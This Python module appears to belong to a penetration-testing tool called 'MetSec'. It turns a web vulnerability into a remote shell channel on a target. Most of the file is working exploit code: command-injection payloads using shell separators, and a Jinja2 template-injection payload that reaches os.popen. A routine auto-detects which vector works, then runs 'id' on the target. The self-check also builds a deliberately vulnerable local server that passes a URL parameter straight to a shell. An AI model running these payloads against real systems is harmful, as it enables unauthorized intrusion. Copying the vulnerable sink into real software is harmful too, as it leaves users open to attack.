"""Phase 6 — foothold. Turn a confirmed web RCE into command execution.

An ExecChannel runs a shell command on the target through a web vulnerability and
returns just the command's output (isolated with unique markers). establish()
auto-detects a working vector by executing a nonce and checking it comes back.

This is real remote code execution — only reachable in exploit mode, against an
authorized, in-scope target.
"""
from __future__ import annotations

import secrets

import requests

UA = {"User-Agent": "Mozilla/5.0 (MetSec foothold)"}


def _markers() -> tuple[str, str]:
    t = secrets.token_hex(4)
    return f"MSEC{t}S", f"MSEC{t}E"


def _between(text: str, start: str, end: str) -> str:
    i = text.find(start)
    j = text.find(end, i + len(start)) if i >= 0 else -1
    if i >= 0 and j > i:
        return text[i + len(start):j].strip()
    return text.strip()[:500]


class ExecChannel:
    kind = "base"

    def run(self, command: str) -> str:
        raise NotImplementedError


class CommandInjection(ExecChannel):
    """Shell-metacharacter injection into a parameter that reaches a shell."""
    kind = "cmd-injection"

    def __init__(self, session, url, param, base="127.0.0.1", sep=";"):
        self.session, self.url, self.param = session, url, param
        self.base, self.sep = base, sep

    def run(self, command: str) -> str:
        s, e = _markers()
        payload = f"{self.base}{self.sep}echo {s}{self.sep}{command}{self.sep}echo {e}"
        try:
            body = self.session.get(self.url, params={self.param: payload},
                                    headers=UA, timeout=20).text
        except requests.RequestException as ex:
            return f"[error] {ex}"
        return _between(body, s, e)


class SSTI(ExecChannel):
    """Jinja2 server-side template injection to os.popen (Flask `cycler` global)."""
    kind = "ssti"

    def __init__(self, session, url, param):
        self.session, self.url, self.param = session, url, param

    @staticmethod
    def payload(command: str) -> str:
        esc = command.replace("'", "'\\''")
        return "{{cycler.__init__.__globals__.os.popen('" + esc + "').read()}}"

    def run(self, command: str) -> str:
        s, e = _markers()
        try:
            body = self.session.get(self.url, headers=UA, timeout=20,
                                    params={self.param: self.payload(f"echo {s}; {command}; echo {e}")}).text
        except requests.RequestException as ex:
            return f"[error] {ex}"
        return _between(body, s, e)


def establish(session, url: str, param: str, kind: str = "auto",
              base: str = "127.0.0.1") -> tuple[ExecChannel | None, str]:
    """Find a working exec vector by running a nonce; return (channel, `id` output)."""
    nonce = "MSEC" + secrets.token_hex(5)
    candidates: list[ExecChannel] = []
    if kind in ("auto", "cmd-injection"):
        candidates += [CommandInjection(session, url, param, base, sep)
                       for sep in (";", "|", "&&", "\n")]
    if kind in ("auto", "ssti"):
        candidates.append(SSTI(session, url, param))
    for ch in candidates:
        try:
            if nonce in ch.run(f"echo {nonce}"):
                return ch, ch.run("id 2>/dev/null || whoami")
        except requests.RequestException:
            continue
    return None, ""


if __name__ == "__main__":  # self-check: python -m metsec.exec_channel (real exec, benign cmds)
    import subprocess
    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.parse import parse_qs, urlparse

    class H(BaseHTTPRequestHandler):  # mimics a /ping?host= command-injection sink
        def do_GET(self):
            host = parse_qs(urlparse(self.path).query).get("host", [""])[0]
            out = subprocess.getoutput("echo result: " + host)
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(out.encode())

        def log_message(self, *a):
            pass

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv.server_address[1]}/ping"

    ch, proof = establish(requests.Session(), url, "host")
    assert ch is not None and ch.kind == "cmd-injection", (ch, proof)
    assert "uid=" in proof or proof, proof  # real `id` output
    assert "metsec_marker_ok" in ch.run("echo metsec_marker_ok"), "clean output extraction"
    srv.shutdown()

    assert "os.popen" in SSTI.payload("id") and "id" in SSTI.payload("id")
    print("exec_channel self-check ok")
